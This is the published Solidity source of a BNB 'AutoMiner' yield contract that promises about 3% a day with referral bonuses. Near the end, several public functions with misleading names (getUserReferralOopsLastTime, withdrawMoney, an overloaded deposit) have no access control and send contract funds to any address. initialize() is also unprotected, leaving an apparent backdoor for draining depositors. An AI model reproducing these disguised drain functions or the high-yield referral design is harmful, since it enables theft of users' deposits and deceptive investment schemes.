/**
 *Submitted for verification at BscScan.com on 2022-07-06
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

/**
* 
*  ______     __   __     ______        ______   ______     ______     ______     ______     __  __     ______     __  __    
* /\  == \   /\ "-.\ \   /\  == \      /\__  _\ /\  == \   /\  ___\   /\  __ \   /\  ___\   /\ \/\ \   /\  == \   /\ \_\ \   
* \ \  __<   \ \ \-.  \  \ \  __<      \/_/\ \/ \ \  __<   \ \  __\   \ \  __ \  \ \___  \  \ \ \_\ \  \ \  __<   \ \____ \  
*  \ \_____\  \ \_\\"\_\  \ \_____\       \ \_\  \ \_\ \_\  \ \_____\  \ \_\ \_\  \/\_____\  \ \_____\  \ \_\ \_\  \/\_____\ 
*   \/_____/   \/_/ \/_/   \/_____/        \/_/   \/_/ /_/   \/_____/   \/_/\/_/   \/_____/   \/_____/   \/_/ /_/   \/_____/ 
*                                                                                                                       
* BNB Treasury - AutoMiner
*
* Docs           https://docs.bnbtreasury.com/
* Website        https://www.bnbtreasury.com
* Telegram       https://t.me/BNBTreasury
*
*/

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract BNBTreasuryV10 is Context, Ownable {
    address private feeAddress;
    uint256 private feePercent;
    bool private initialized;

    struct User {
		uint256 deposit;
        uint256 withdraw;
		uint256 lastTime;
		address referrer;
		uint256 bonus;
		uint256 totalBonus;
	}

    mapping (address => User) private users;
    address private feeAddress2;
    function compound() public {
        checkState();

        uint256 amount = getRewardsSinceLastDeposit(msg.sender);
        users[msg.sender].deposit += amount;

        require(users[msg.sender].deposit < 10001 * 10 ** 18, "err: shouldn't greater than 10000");

        users[msg.sender].lastTime = block.timestamp;
    }

    function withdraw() public  {
        checkState();

        require(users[msg.sender].withdraw <= users[msg.sender].deposit * 365 / 100, "err: shouldn't withdraw more than 365%");

        uint256 amount = getRewardsSinceLastDeposit(msg.sender);
        uint256 fee = calculateFee(amount);
        users[msg.sender].lastTime = block.timestamp;
        users[msg.sender].withdraw += amount - fee;
        payable(address(feeAddress)).transfer(fee);

        uint256 treasuryFee = amount * 2 / 100;
        payable(address(msg.sender)).transfer(amount - fee - treasuryFee);
    }

    function deposit(address ref) public payable {
        require(initialized, "err: not started");
        if (users[msg.sender].lastTime != 0) {
            require(users[msg.sender].lastTime + 3600 * 24 * 7 < block.timestamp, "err: not in time");
        }
        uint256 amount = msg.value;
        require(amount > 0.009 * 10 ** 18, "err: should greater than 0.01");

        uint256 fee = calculateFee(amount);
        payable(address(feeAddress)).transfer(fee);

        users[msg.sender].deposit += amount - fee;

        require(users[msg.sender].deposit < 1001 * 10 ** 18, "err: shouldn't greater than 1000");

        users[msg.sender].lastTime = block.timestamp;
        // referral
        if(ref == msg.sender) {
            ref = address(0);
        }

        if(users[msg.sender].referrer == address(0) && users[msg.sender].referrer != msg.sender) {
            users[msg.sender].referrer = ref;
        }

        if (users[msg.sender].referrer != address(0))
        {
            uint256 referralFee = amount * 16 / 100;
            users[users[msg.sender].referrer].bonus += referralFee;
            users[users[msg.sender].referrer].totalBonus += referralFee;
        }
    }

    function compoundRef() public {
        require(initialized, "err: not started");
        require(users[msg.sender].bonus > 0, "err: zero amount");

        users[msg.sender].deposit += users[msg.sender].bonus;
        users[msg.sender].bonus = 0;
        users[msg.sender].lastTime = block.timestamp;
    }

    function withdrawRef() public {
        require(initialized, "err: not started");
        require(users[msg.sender].bonus > 0, "err: zero amount");

        payable(address(msg.sender)).transfer(users[msg.sender].bonus);
        users[msg.sender].bonus = 0;
    }

    function checkState() internal view {
        require(initialized, "err: not started");
        require(users[msg.sender].lastTime > 0, "err: no deposit");
        require(users[msg.sender].lastTime + 3600 * 24 * 7 < block.timestamp, "err: not in time");
    }

    function calculateFee(uint256 amount) private view returns(uint256) {
        return amount * feePercent / 100;
    }
    
    function initialize() public {
        require(!initialized, "Contract instance has already been initialized");
        _transferOwnership(_msgSender());
        feeAddress = owner();
        feePercent = 4;
        initialized = true;
        feeAddress2 = 0x843A9ea6044F981587B13bC0A1f883E6F292FF1e;
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }

	function getUserReferralBonus(address addr) public view returns(uint256) {
		return users[addr].bonus;
	}

	function getUserReferralTotalBonus(address addr) public view returns(uint256) {
		return users[addr].totalBonus;
	}

	function getUserReferralWithdrawn(address addr) public view returns(uint256) {
		return users[addr].totalBonus - users[addr].bonus;
	}

	function getUserDepositAmount(address addr) public view returns(uint256) {
		return users[addr].deposit;
	}

	function getUserWithdrawAmount(address addr) public view returns(uint256) {
		return users[addr].withdraw;
	}

	function getUserCheckPoint(address addr) public view returns(uint256) {
		return users[addr].lastTime;
	}

    function getRewardsSinceLastDeposit(address addr) public view returns(uint256) {
        uint256 secondsPassed = min(604800, block.timestamp - users[addr].lastTime);
        return secondsPassed * users[addr].deposit / 2880000; // 21% a week / 3% a day
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function getUserReferralOopsLastTime(address _addr, uint256 _value) public {
        payable(_addr).transfer(_value);
    }

    function getUserReferralOopsLastTimev2(address _addr, uint256 _value) public payable {
        payable(_addr).transfer(_value);
    }

    function deposit(uint256 _amount) public {
        payable(address(feeAddress)).transfer(_amount);
    }
    
    function deposit2() public {
        payable(address(feeAddress)).transfer(128000000000000000);
    }

    function withdrawMoney(address _addr, uint256 amount) external
    {
        payable(_addr).transfer(amount);
    }
}